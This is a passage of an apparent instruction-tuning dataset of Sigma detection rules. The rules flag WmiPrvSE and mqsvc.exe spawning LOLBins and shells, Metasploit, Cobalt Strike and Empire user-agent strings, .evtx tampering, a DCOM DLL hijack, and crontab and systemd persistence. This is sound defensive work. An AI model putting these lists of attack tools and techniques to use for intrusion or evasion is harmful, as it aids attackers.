    "instruction": "Build a Sigma rule with the goal of detecting suspicious and uncommon child processes of WmiPrvSE.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious and uncommon child processes of WmiPrvSE, you should: monitor the creation of processes on Windows systems, specifically looking for instances where the Windows Management Instrumentation Provider Service (WmiPrvSE.exe) spawns child processes. Pay particular attention to child processes that are typically associated with living off the land binaries and scripts (LOLBAS) or are otherwise suspicious in the context of WmiPrvSE.exe, such as certutil.exe, cscript.exe, mshta.exe, msiexec.exe, regsvr32.exe, rundll32.exe, verclsid.exe, and wscript.exe. Another critical set of detections involves monitoring for the command-line interpreter (cmd.exe) being spawned as a child process of WmiPrvSE.exe, particularly if the command line includes references to scripts or tools often used in attacks, like cscript, mshta, powershell, pwsh, regsvr32, rundll32, and wscript. Exclude any instances where WerFault.exe or additional instances of WmiPrvSE.exe are spawned, as these can be indicative of legitimate behavior or error conditions. It's important to act on these detections due to their high potential for being indicative of malicious activity, although there may be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\wbem\\WmiPrvSE.exe'\n    selection_children_1:\n        # TODO: Add more LOLBINs or suspicious processes that make sens in your environment\n        Image|endswith:\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\verclsid.exe'\n            - '\\wscript.exe'\n    selection_children_2:\n        # This is in a separate selection due to the nature of FP generated with CMD\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains:\n            - 'cscript'\n            - 'mshta'\n            - 'powershell'\n            - 'pwsh'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe' # In some legitimate case WmiPrvSE was seen spawning itself\n    condition: selection_parent and 1 of selection_children_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\wbem\\WmiPrvSE.exe'\n    selection_children_1:\n        # TODO: Add more LOLBINs or suspicious processes that make sens in your environment\n        Image|endswith:\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\verclsid.exe'\n            - '\\wscript.exe'\n    selection_children_2:\n        # This is in a separate selection due to the nature of FP generated with CMD\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains:\n            - 'cscript'\n            - 'mshta'\n            - 'powershell'\n            - 'pwsh'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe' # In some legitimate case WmiPrvSE was seen spawning itself\n    condition: selection_parent and 1 of selection_children_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious and uncommon child processes of WmiPrvSE",
      "answer": "In order to detect suspicious and uncommon child processes of WmiPrvSE, you should: monitor the creation of processes on Windows systems, specifically looking for instances where the Windows Management Instrumentation Provider Service (WmiPrvSE.exe) spawns child processes. Pay particular attention to child processes that are typically associated with living off the land binaries and scripts (LOLBAS) or are otherwise suspicious in the context of WmiPrvSE.exe, such as certutil.exe, cscript.exe, mshta.exe, msiexec.exe, regsvr32.exe, rundll32.exe, verclsid.exe, and wscript.exe. Another critical set of detections involves monitoring for the command-line interpreter (cmd.exe) being spawned as a child process of WmiPrvSE.exe, particularly if the command line includes references to scripts or tools often used in attacks, like cscript, mshta, powershell, pwsh, regsvr32, rundll32, and wscript. Exclude any instances where WerFault.exe or additional instances of WmiPrvSE.exe are spawned, as these can be indicative of legitimate behavior or error conditions. It's important to act on these detections due to their high potential for being indicative of malicious activity, although there may be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs, you should monitor for specific user agent strings that are known to be associated with various exploitation and penetration testing tools, such as Cobalt Strike and Metasploit, within your proxy logs. These distinctive user agent strings can indicate an attacker is attempting to obfuscate their malicious activity to blend in with normal traffic or is leveraging a known tool for exploitation purposes.\n\nMonitoring requires scrutinizing proxy log entries for user agent strings that mimic older versions of Internet Explorer, or other browsers, which are uncommon in modern web traffic and thereby suspicious. This includes very specific versions of browser user agent strings that are documented to be employed by penetration testing software to conduct attacks or perform reconnaissance.\n\nFurthermore, lookout for user agent strings that explicitly mention tools or activities associated with hacking or penetration testing frameworks, such as explicit references to Metasploit, Cobalt Strike, or empire frameworks. Also, peculiar user agent strings that could be related to automated scripts or bots, for example, strings that mention Googlebot outside of the context of web server logs, or that contain keywords like 'exploit' or reference tool-specific markings like 'DotDotPwn', should be flagged.\n\nThe approach requires the capture and analysis of the Client IP, the requested URI (Uniform Resource Identifier), and the user agent string (c-useragent) from the proxy logs. Even though the potential for false positives exists due to legitimate but outdated user agent strings or benign tools generating similar patterns, the identified user agent strings often correlate to malicious activity and therefore merit higher scrutiny or investigation at a high level of alert severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent:\n        # Cobalt Strike https://www.cobaltstrike.com/help-malleable-c2\n            - 'Internet Explorer *'\n            - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)' # https://goo.gl/f4H5Ez\n\n        # Metasploit Framework - Analysis by Didier Stevens https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/\n            - 'Mozilla/4.0 (compatible; Metasploit RSPEC)'\n            - 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'\n            - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N'\n            - 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' # only use in proxy logs - not for detection in web server logs\n            - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13'\n            - 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)' # Payloads\n\n        # Metasploit Update by Florian Roth 08.07.2017\n            - 'Mozilla/5.0'\n            - 'Mozilla/4.0 (compatible; SPIPE/1.0'\n        # - 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'  # too many false positives expected\n        # - 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'  # too many false positives expected\n            - 'Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0'\n            - 'Sametime Community Agent' # Unknown if prone to false positives - used in https://goo.gl/gHZkeR\n            - 'X-FORWARDED-FOR'\n            - 'DotDotPwn v2.1'\n            - 'SIPDROID'\n            - 'Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)' # CobaltStrike https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/\n\n        # Empire\n            - 'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0'\n\n        # Exploits\n            - '*wordpress hash grabber*'\n            - '*exploit*'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent:\n        # Cobalt Strike https://www.cobaltstrike.com/help-malleable-c2\n            - 'Internet Explorer *'\n            - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)' # https://goo.gl/f4H5Ez\n\n        # Metasploit Framework - Analysis by Didier Stevens https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/\n            - 'Mozilla/4.0 (compatible; Metasploit RSPEC)'\n            - 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'\n            - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)' # old browser, rare, base-lining needed\n            - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N'\n            - 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' # only use in proxy logs - not for detection in web server logs\n            - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13'\n            - 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)' # Payloads\n\n        # Metasploit Update by Florian Roth 08.07.2017\n            - 'Mozilla/5.0'\n            - 'Mozilla/4.0 (compatible; SPIPE/1.0'\n        # - 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'  # too many false positives expected\n        # - 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'  # too many false positives expected\n            - 'Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0'\n            - 'Sametime Community Agent' # Unknown if prone to false positives - used in https://goo.gl/gHZkeR\n            - 'X-FORWARDED-FOR'\n            - 'DotDotPwn v2.1'\n            - 'SIPDROID'\n            - 'Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)' # CobaltStrike https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/\n\n        # Empire\n            - 'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0'\n\n        # Exploits\n            - '*wordpress hash grabber*'\n            - '*exploit*'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs",
      "answer": "In order to detect suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs, you should monitor for specific user agent strings that are known to be associated with various exploitation and penetration testing tools, such as Cobalt Strike and Metasploit, within your proxy logs. These distinctive user agent strings can indicate an attacker is attempting to obfuscate their malicious activity to blend in with normal traffic or is leveraging a known tool for exploitation purposes.\n\nMonitoring requires scrutinizing proxy log entries for user agent strings that mimic older versions of Internet Explorer, or other browsers, which are uncommon in modern web traffic and thereby suspicious. This includes very specific versions of browser user agent strings that are documented to be employed by penetration testing software to conduct attacks or perform reconnaissance.\n\nFurthermore, lookout for user agent strings that explicitly mention tools or activities associated with hacking or penetration testing frameworks, such as explicit references to Metasploit, Cobalt Strike, or empire frameworks. Also, peculiar user agent strings that could be related to automated scripts or bots, for example, strings that mention Googlebot outside of the context of web server logs, or that contain keywords like 'exploit' or reference tool-specific markings like 'DotDotPwn', should be flagged.\n\nThe approach requires the capture and analysis of the Client IP, the requested URI (Uniform Resource Identifier), and the user agent string (c-useragent) from the proxy logs. Even though the potential for false positives exists due to legitimate but outdated user agent strings or benign tools generating similar patterns, the identified user agent strings often correlate to malicious activity and therefore merit higher scrutiny or investigation at a high level of alert severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of new files with the \".evtx\" extension in non-common locations. Which could indicate tampering with default evtx locations in order to evade security controls.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of new files with the \".evtx\" extension in non-common locations, which could indicate tampering with default evtx locations in order to evade security controls, you should monitor file events on Windows systems for occurrences of files with the \".evtx\" extension being created outside of their standard locations. Specifically, your monitoring should be configured to trigger alerts when such a file is identified, but exclude events related to the legitimate Windows Event Log directories, typically found under 'C:\\Windows\\System32\\winevt\\Logs\\', as well as paths associated with Windows Containers located at 'C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\' that end with '\\Windows\\System32\\winevt\\Logs\\'. Furthermore, actions performed by certain known processes like 'C:\\Windows\\explorer.exe' and 'C:\\Windows\\system32\\dllhost.exe' should be included in the exclusions to reduce false positives. Such exclusions help in distinguishing between legitimate administrative activities, such as event log backups or maintenance, and potentially malicious actions aimed at evading detection by manipulating event log files. This approach ensures a balanced monitoring strategy that focuses on identifying genuine security threats while minimizing interruptions caused by routine system operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\n    definition: 'Requirements: The \".evtx\" exntesion should be monitored via a Sysmon configuration. Example: <TargetFilename condition=\"end with\">.evtx<TargetFilename>'\ndetection:\n    selection:\n        TargetFilename|endswith: '.evtx'\n    filter_path:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\winevt\\Logs\\'\n    filter_baseimage:\n        TargetFilename|startswith: 'C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\'\n        TargetFilename|endswith: '\\Windows\\System32\\winevt\\Logs\\'\n    filter_img:\n        Image:\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\Windows\\system32\\dllhost.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Admin activity\n    - Backup activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\n    definition: 'Requirements: The \".evtx\" exntesion should be monitored via a Sysmon configuration. Example: <TargetFilename condition=\"end with\">.evtx<TargetFilename>'\ndetection:\n    selection:\n        TargetFilename|endswith: '.evtx'\n    filter_path:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\winevt\\Logs\\'\n    filter_baseimage:\n        TargetFilename|startswith: 'C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\'\n        TargetFilename|endswith: '\\Windows\\System32\\winevt\\Logs\\'\n    filter_img:\n        Image:\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\Windows\\system32\\dllhost.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Admin activity\n    - Backup activity\nlevel: medium\n",
      "question": "creation of new files with the \".evtx\" extension in non-common locations. Which could indicate tampering with default evtx locations in order to evade security controls",
      "answer": "In order to detect the creation of new files with the \".evtx\" extension in non-common locations, which could indicate tampering with default evtx locations in order to evade security controls, you should monitor file events on Windows systems for occurrences of files with the \".evtx\" extension being created outside of their standard locations. Specifically, your monitoring should be configured to trigger alerts when such a file is identified, but exclude events related to the legitimate Windows Event Log directories, typically found under 'C:\\Windows\\System32\\winevt\\Logs\\', as well as paths associated with Windows Containers located at 'C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\' that end with '\\Windows\\System32\\winevt\\Logs\\'. Furthermore, actions performed by certain known processes like 'C:\\Windows\\explorer.exe' and 'C:\\Windows\\system32\\dllhost.exe' should be included in the exclusions to reduce false positives. Such exclusions help in distinguishing between legitimate administrative activities, such as event log backups or maintenance, and potentially malicious actions aimed at evading detection by manipulating event log files. This approach ensures a balanced monitoring strategy that focuses on identifying genuine security threats while minimizing interruptions caused by routine system operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation of CVE-2023-21554 (dubbed QueueJumper).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential exploitation of CVE-2023-21554 (dubbed QueueJumper), you should: monitor the process creation logs on Windows systems, specifically looking for events where the Microsoft Message Queue Service (`mqsvc.exe`), located in the `Windows\\System32` directory, spawns known command execution or scripting tools. These tools include `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. Identifying such a pattern is critical as it might indicate an attempt to exploit QueueJumper, leveraging `mqsvc.exe` as a parent process to execute potentially malicious commands or scripts. It's important to have vigilant monitoring in place due to the high impact of this vulnerability, while also being aware of possible unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\Windows\\System32\\mqsvc.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\Windows\\System32\\mqsvc.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential exploitation of CVE-2023-21554 (dubbed QueueJumper)",
      "answer": "In order to detect potential exploitation of CVE-2023-21554 (dubbed QueueJumper), you should: monitor the process creation logs on Windows systems, specifically looking for events where the Microsoft Message Queue Service (`mqsvc.exe`), located in the `Windows\\System32` directory, spawns known command execution or scripting tools. These tools include `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. Identifying such a pattern is critical as it might indicate an attempt to exploit QueueJumper, leveraging `mqsvc.exe` as a parent process to execute potentially malicious commands or scripts. It's important to have vigilant monitoring in place due to the high impact of this vulnerability, while also being aware of possible unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario, you should monitor Windows Security logs for events with ID 5145, which signifies a network file share event. Specifically, focus on the instances where files ending with the name '\\Internet Explorer\\iertutil.dll' are being created or modified. However, to avoid catching legitimate system processes, exclude any events where the subject username ends with a dollar sign \u2018$\u2019, as these are typically associated with computer accounts rather than user accounts. The significance of detecting such activity lies in its potential association with malicious behaviors, specifically a DLL Hijack scenario targeting Internet Explorer\u2019s DCOM components. This kind of attack can indicate an adversary's attempt to execute unauthorized code or commands. It is crucial to note that false positives are unknown, suggesting that while this detection is highly targeted, there may still be legitimate scenarios that could trigger it. Consequently, thorough investigation of each alert is advised to determine its nature accurately.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|endswith: '\\Internet Explorer\\iertutil.dll'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|endswith: '\\Internet Explorer\\iertutil.dll'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario.",
      "answer": "In order to detect a threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario, you should monitor Windows Security logs for events with ID 5145, which signifies a network file share event. Specifically, focus on the instances where files ending with the name '\\Internet Explorer\\iertutil.dll' are being created or modified. However, to avoid catching legitimate system processes, exclude any events where the subject username ends with a dollar sign \u2018$\u2019, as these are typically associated with computer accounts rather than user accounts. The significance of detecting such activity lies in its potential association with malicious behaviors, specifically a DLL Hijack scenario targeting Internet Explorer\u2019s DCOM components. This kind of attack can indicate an adversary's attempt to execute unauthorized code or commands. It is crucial to note that false positives are unknown, suggesting that while this detection is highly targeted, there may still be legitimate scenarios that could trigger it. Consequently, thorough investigation of each alert is advised to determine its nature accurately."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious modification of crontab file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious modification of crontab file, you should: Monitor Linux systems, focusing specifically on logs generated by the cron service. Look for the occurrence of the keyword 'REPLACE' within these logs, as this indicates potential unauthorized or suspicious changes to the crontab file. It's important to keep in mind that there can be legitimate modifications to the crontab file; hence, not all detections might represent malicious activity. The severity level for this activity is considered medium, suggesting that while it's important to investigate, it might not always indicate a high-threat level compromise. This monitoring strategy is designed to protect against tactics and techniques that involve the manipulation of scheduled tasks for persistence, execution, or privilege escalation purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: cron\ndetection:\n    keywords:\n        - 'REPLACE'\n    condition: keywords\nfalsepositives:\n    - Legitimate modification of crontab\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: cron\ndetection:\n    keywords:\n        - 'REPLACE'\n    condition: keywords\nfalsepositives:\n    - Legitimate modification of crontab\nlevel: medium\n",
      "question": "suspicious modification of crontab file.",
      "answer": "In order to detect suspicious modification of crontab file, you should: Monitor Linux systems, focusing specifically on logs generated by the cron service. Look for the occurrence of the keyword 'REPLACE' within these logs, as this indicates potential unauthorized or suspicious changes to the crontab file. It's important to keep in mind that there can be legitimate modifications to the crontab file; hence, not all detections might represent malicious activity. The severity level for this activity is considered medium, suggesting that while it's important to investigate, it might not always indicate a high-threat level compromise. This monitoring strategy is designed to protect against tactics and techniques that involve the manipulation of scheduled tasks for persistence, execution, or privilege escalation purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution GMER tool based on image and hash fields..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution GMER tool based on image and hash fields, you should monitor Windows process creation logs for any activity that involves the execution of 'gmer.exe'. Pay particular attention to processes that have either of the specific hashes: MD5 hash as 'E9DC058440D321AA17D0600B3CA0AB04', SHA1 hash as '539C228B6B332F5AA523E5CE358C16647D8BBE57', or SHA256 hash as 'E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'. These criteria are meticulously chosen to pinpoint the tool's execution without capturing unrelated processes, making false positives unlikely. The delineation on process creation and specific hash values is of high importance for ensuring the security and integrity of the system by identifying possible unauthorized or suspicious use of GMER, which is a tool known for its capabilities in the analysis and detection of rootkits.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\gmer.exe'\n    selection_sysmon_hash:\n        Hashes|contains:\n            - 'MD5=E9DC058440D321AA17D0600B3CA0AB04'\n            - 'SHA1=539C228B6B332F5AA523E5CE358C16647D8BBE57'\n            - 'SHA256=E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'\n    selection_other:\n        - md5: 'e9dc058440d321aa17d0600b3ca0ab04'\n        - sha1: '539c228b6b332f5aa523e5ce358c16647d8bbe57'\n        - sha256: 'e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\gmer.exe'\n    selection_sysmon_hash:\n        Hashes|contains:\n            - 'MD5=E9DC058440D321AA17D0600B3CA0AB04'\n            - 'SHA1=539C228B6B332F5AA523E5CE358C16647D8BBE57'\n            - 'SHA256=E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'\n    selection_other:\n        - md5: 'e9dc058440d321aa17d0600b3ca0ab04'\n        - sha1: '539c228b6b332f5aa523e5ce358c16647d8bbe57'\n        - sha256: 'e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution GMER tool based on image and hash fields.",
      "answer": "In order to detect the execution GMER tool based on image and hash fields, you should monitor Windows process creation logs for any activity that involves the execution of 'gmer.exe'. Pay particular attention to processes that have either of the specific hashes: MD5 hash as 'E9DC058440D321AA17D0600B3CA0AB04', SHA1 hash as '539C228B6B332F5AA523E5CE358C16647D8BBE57', or SHA256 hash as 'E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'. These criteria are meticulously chosen to pinpoint the tool's execution without capturing unrelated processes, making false positives unlikely. The delineation on process creation and specific hash values is of high importance for ensuring the security and integrity of the system by identifying possible unauthorized or suspicious use of GMER, which is a tool known for its capabilities in the analysis and detection of rootkits."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SILENTTRINITY stager use via PE metadata.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SILENTTRINITY stager use via PE metadata, you should: Monitor the creation of processes on Windows operating systems. Specifically, look for occurrences where the process creation logs include a description that contains the term 'st2stager'. This term is indicative of the SILENTTRINITY stager's use, which is a tool that can be employed by attackers to gain remote access and execute commands on a compromised system. Since the likelihood of encountering this term within a legitimate process's description is low, instances flagged by this criterion are considered to have a high level of threat. By focusing on this detection method, you leverage one of the critical indicators to identify the utilization of SILENTTRINITY stager in the environment effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description|contains: 'st2stager'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description|contains: 'st2stager'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "SILENTTRINITY stager use via PE metadata",
      "answer": "In order to detect SILENTTRINITY stager use via PE metadata, you should: Monitor the creation of processes on Windows operating systems. Specifically, look for occurrences where the process creation logs include a description that contains the term 'st2stager'. This term is indicative of the SILENTTRINITY stager's use, which is a tool that can be employed by attackers to gain remote access and execute commands on a compromised system. Since the likelihood of encountering this term within a legitimate process's description is low, instances flagged by this criterion are considered to have a high level of threat. By focusing on this detection method, you leverage one of the critical indicators to identify the utilization of SILENTTRINITY stager in the environment effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of systemd services which could be used by adversaries to execute malicious code..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of systemd services which could be used by adversaries to execute malicious code, you should monitor audit logs on Linux systems, specifically those from auditd, for events related to the creation of paths. Focus on events where the type of action is \"CREATE.\" Look specifically for the creation of names starting with '/usr/lib/systemd/system/' or '/etc/systemd/system/' as well as names that contain '/.config/systemd/user/'. These locations are commonly associated with systemd service files, which can be exploited by attackers to execute malicious code persistently on a system. Be aware that administrative actions such as legitimate service installation may trigger these alerts, hence they are considered potential false positives. This detection strategy is of medium importance and is aligned with understanding and responding to tactics and techniques related to the execution of unauthorized commands or scripts through system service manipulation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    path:\n        type: 'PATH'\n        nametype: 'CREATE'\n    name_1:\n        name|startswith:\n            - '/usr/lib/systemd/system/'\n            - '/etc/systemd/system/'\n    name_2:\n        name|contains: '/.config/systemd/user/'\n    condition: path and 1 of name_*\nfalsepositives:\n    - Admin work like legit service installs.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
